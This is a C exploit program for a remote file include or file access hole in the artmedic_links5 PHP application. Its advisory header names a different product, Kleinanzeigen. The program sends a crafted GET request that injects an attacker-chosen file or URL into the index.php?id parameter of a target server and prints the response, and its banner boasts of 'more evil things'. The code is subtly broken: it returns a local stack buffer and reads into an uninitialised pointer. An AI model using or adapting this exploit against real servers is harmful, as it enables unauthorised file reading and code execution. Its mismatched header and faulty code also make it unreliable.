/*
source: http://www.securityfocus.com/bid/10746/info

Kleinanzeigen is prone to a file include vulnerability. This issue could allow a remote attacker to include malicious files containing arbitrary code to be executed on a vulnerable computer.

If successful, the malicious script supplied by the attacker will be executed in the context of the web server hosting the vulnerable software.
*/

/* 
 * artmedic_links5 remote file access exploit 
 * Adam Simuntis <n30n@o2.pl>
 */


#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <getopt.h>

extern int h_errno;

#define PHP_FILE "index.php?id"
#define BANNER "\nartmedic_links5 remote file access (can be used for more evil things)\nAdam Simuntis <n30n@o2.pl>\n"


int usage(char *p_name){
printf("\n\n%s { options } "
       "\n\t-s Hostname / IP Address"
       "\n\t-c Path to file"
       "\n\t-p Server port"
       "\n\t-P artmedic links5 path ,ex.:"
       "\n\t\t/artmedic_links5/"
       "\n\t-h This help..\n\n",p_name);
exit(-1);
}

char *header(char *path, char *php_file, char *cmd, char *host){

char buf[8192];

sprintf(buf, 
"GET %s%s=%s HTTP/1.1\r\n"
"Host: %s\r\n"
"User-Agent: Mozilla/5.0 (X11; U; Linux i666; en-US; rv:1.7.5) " 
"Gecko/20050304 Firefox/1.0\r\n"
"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,"
"text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
"Accept-Language: en-us,en;q=0.5\r\n"
"Accept-Encoding: gzip,deflate\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"Keep-Alive: 300\r\n"
"Connection: keep-alive\r\n"
"\r\n\n",path,php_file,cmd,host);

return buf;

}

int main(int argc, char **argv){
int opt, gniazdko, port;
struct hostent *hp;
struct sockaddr_in s;
char *target, *command, *wej, *header_p, *path, *addr;

if(argc<2) usage(argv[0]); 
if(argc>1){

while(( opt = getopt(argc,argv,"s:p:P:c:?")) != -1 ){

switch(opt){

     case 's':
     target = optarg;
     break;

     case 'c':
     command = optarg;
     break;

     case 'p':
     port = atoi(optarg);
     break;

     case 'P':
     path = optarg;
     break;

     case 'h':
     case '?':
     default:
     usage(argv[0]);
     break;
     
     }
}

memset(&s,0,sizeof(s));

hp = gethostbyname(target);
addr = inet_ntoa( *(struct in_addr *)hp->h_addr_list[0] );

puts(BANNER);

s.sin_port = htons(port);
s.sin_family = AF_INET;
s.sin_addr.s_addr = inet_addr(addr);

if( (gniazdko = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 ) printf("\n{-} Cannot create socket!\n");

if (connect(gniazdko, (struct sockaddr*)&s, 16) < 0){
	printf("\nConnection failed!\n");
	exit(-1);
}

header_p = header(path,PHP_FILE,command,target);
printf("\n{+} Sending request and returning server answer, please wait a while..\n");
sleep(2);
send(gniazdko, header_p, strlen(header_p), 0);

while(read(gniazdko, &wej, 1))
putchar(wej);

close(gniazdko);

return 0;
}
}